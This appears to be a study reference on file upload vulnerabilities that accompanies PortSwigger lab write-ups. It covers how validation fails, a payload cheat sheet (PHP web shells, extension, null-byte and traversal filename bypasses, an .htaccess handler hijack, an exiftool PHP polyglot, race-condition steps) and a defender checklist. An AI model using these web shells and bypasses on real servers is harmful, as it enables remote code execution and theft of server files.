# 📖 Vulnerability Deep Dive — File Upload

> A complete reference on file upload vulnerabilities: what they are, how validation is typically implemented (and broken), and a practical payload cheat sheet. This is the theory companion to the [lab writeups](./README.md) and the [mindset doc](./METHODOLOGY.md).

---

## 1. What Is a File Upload Vulnerability?

A file upload vulnerability exists when a web application accepts a file from a user and processes, stores, or serves it in a way that allows the attacker to achieve something beyond "store a file" — most critically, **getting arbitrary code executed on the server** by uploading a script (a "web shell") and then triggering it via a request.

The impact scales with what's reachable once code execution is achieved: reading sensitive files, pivoting to internal systems, full server compromise, or using the server as a foothold into the wider network.

**CWE-434: Unrestricted Upload of File with Dangerous Type** is the primary classification; specific bypass techniques map to their own CWEs (path traversal, null byte handling, race conditions, etc. — see each lab's writeup).

## 2. Where Does the Uploaded File Need to Land?

For a web shell to be useful, three things generally need to be true:

1. **The file must be saved somewhere the web server will serve it back** (directly, or the application exposes a download/view endpoint for it).
2. **The server must be willing to *execute* it as code** rather than just return its raw bytes (e.g. the directory's PHP handler is active for that file's extension).
3. **The attacker must be able to request it** — know or guess its URL.

Any defense that reliably breaks even one of these three links stops the attack — which is exactly why "store uploads outside the web root" or "store uploads somewhere scripts never execute" are such effective, simple fixes.

## 3. The Layers of Validation (and How Each One Fails)

### a) Client-Side Filtering
Runs in the browser (usually JavaScript) before the request is even sent. **Always bypassable** because the attacker fully controls their own browser/request:
- Disable JavaScript in the browser (if the site still functions).
- Intercept the page response in a proxy and strip the filtering script before it loads.
- Intercept the upload request itself and modify it after the client-side check already passed.
- Skip the web page entirely and POST directly to the upload endpoint with `curl` or a proxy tool.

### b) Extension Validation
Checks the filename's extension against a **blacklist** (reject specific extensions) or an **allow-list** (accept only specific extensions). Allow-lists are meaningfully stronger, but both can fail depending on implementation:
- **Blacklist gaps**: a filter blocking `.php` alone misses `.php3/4/5/7`, `.phtml`, `.phar`, `.pht`, and server-specific handler mappings.
- **Substring checks instead of suffix checks**: if the filter looks for `.jpg` *anywhere* in the filename rather than strictly at the end, `shell.jpg.php` can pass.
- **Parsing differences**: some code finds the *first* dot, some the *last* — a filename with multiple dots can exploit the mismatch.
- **Null byte truncation**: `shell.php%00.jpg` — the high-level check sees `.jpg`; the underlying C-based file write truncates at the null byte and saves `shell.php`. (Patched in PHP ≥ 5.3.4, but still seen in legacy/other-language contexts.)
- **Server config files**: uploading `.htaccess` (Apache) or `web.config` (IIS) can redefine which extension the server executes as a script, letting the attacker register their own custom extension that was never on any blacklist.

### c) Filename / Path Handling
Even when extension and content checks are solid, the **filename itself** may not be sanitized correctly:
- A naive traversal filter might strip literal `../` but run *before* URL-decoding, letting `..%2f` slip through and later decode into a real traversal sequence.
- Writing a file outside its intended directory can land it somewhere with different (laxer) execution rules, defeating a directory-level restriction entirely.

### d) File Type / Content Validation
More intensive than extension checks — looks at the file's actual declared or real type:
- **MIME type validation**: the `Content-Type` field in the multipart upload is attacker-controlled and derived client-side from the extension — trivially spoofed by editing the request in a proxy.
- **Magic number validation**: checks the first few bytes of the file against known signatures (e.g. `FF D8 FF DB` for JPEG, `89 50 4E 47 0D 0A 1A 0A` for PNG, `47 49 46 38 37 61` for GIF87a). Bypassed by prepending the correct magic bytes to an otherwise malicious file.
- **Full content/structural validation**: the server genuinely parses the file as an image (dimensions, valid structure). This is the hardest to bypass and generally requires a true **polyglot** — a file that is simultaneously valid as both an image and a script, typically by embedding the payload in a metadata field (EXIF `Comment`, etc.) that the image parser ignores but the PHP interpreter still scans and executes.

### e) File Length Filtering
Caps the upload size to prevent resource exhaustion. Rarely an obstacle for a small web shell (a few hundred bytes), but can block larger pre-built reverse shell scripts — if hit, look for a smaller or minimized shell.

### f) Time-of-Check to Time-of-Use (TOCTOU) / Race Conditions
Some implementations write the file to its public, accessible location **before** running validation, deleting it afterward only if it fails. This creates a window — sometimes milliseconds wide — during which the file is live and executable. Exploited by firing many concurrent requests for the file at (or just after) upload time, aiming to land inside that window before deletion.

## 4. Payload & Technique Cheat Sheet

### Basic PHP Web Shell
```php
<?php echo system($_GET['cmd']); ?>
```
```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```

### Extension Bypass Candidates (PHP-oriented servers)
```
.php  .php3  .php4  .php5  .php7  .phtml  .phar  .pht  .phps
```

### Null Byte Bypass (legacy PHP)
```
shell.php%00.jpg
```

### Double-Extension / Substring Bypass
```
shell.jpg.php
```

### Path Traversal in Filename (escape a non-executing directory)
```
../exploit.php
..%2fexploit.php      (URL-encoded, to bypass naive pre-decode stripping)
```

### .htaccess Handler Hijack (Apache)
```apache
AddType application/x-httpd-php .l33t
```
Upload this as `.htaccess` in the target directory, then upload your shell with the `.l33t` extension (or any extension of your choosing that isn't blacklisted).

### Magic Number Spoofing

| Format | Magic Bytes (hex) |
|---|---|
| JPEG | `FF D8 FF DB` (one common variant) |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF87a | `47 49 46 38 37 61` |
| GIF89a | `47 49 46 38 39 61` |

### Polyglot Image/PHP via ExifTool
```bash
exiftool -Comment='<?php echo "START " . file_get_contents("/path/to/secret") . " END"; ?>' input.jpg -o polyglot.php
```

### MIME Type Spoofing
Change the multipart body's declared:
```
Content-Type: application/x-php
```
to an accepted value such as:
```
Content-Type: image/jpeg
```

### Race Condition Exploitation (Burp)
1. Capture the upload `POST` request and a `GET` request for the expected resulting path.
2. Group both (plus several duplicate `GET`s) in Burp Repeater, or use Turbo Intruder for tighter timing control.
3. Use **Send group in parallel (single-packet attack)** over HTTP/2 to minimize timing skew.
4. Look for a `GET` response that returns `200 OK` with your payload's output, rather than `404`.

## 5. Remediation Checklist (For Defenders)

- [ ] Validate extensions against a **strict allow-list**, never a blacklist.
- [ ] Sanitize and validate filenames *after* all decoding has occurred; reject path separators and traversal sequences outright.
- [ ] Re-encode/re-process uploaded images server-side (resize, re-save via an image library) rather than storing raw uploaded bytes — this strips embedded payloads in metadata.
- [ ] Strip all metadata (EXIF, etc.) from uploaded media as standard practice.
- [ ] Validate real file content/structure, not just extension or client-supplied MIME type.
- [ ] Generate a new, random filename server-side for every upload; never trust any part of the client-supplied name.
- [ ] Store uploads **outside the web root**, or in a location explicitly configured to never execute scripts regardless of extension.
- [ ] Disable per-directory config file overrides (`AllowOverride None` in Apache) in upload directories.
- [ ] Validate and move files **before** they become publicly reachable — never expose a file via a guessable URL prior to full validation completing.
- [ ] Enforce sensible file size limits.
- [ ] Apply defense in depth: assume any single layer can fail, and ensure the combination of controls still prevents code execution.

## 6. References

- [PortSwigger — File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [CWE-367: Time-of-Check Time-of-Use Race Condition](https://cwe.mitre.org/data/definitions/367.html)

---

*Educational reference material only — PortSwigger Web Security Academy environment.*
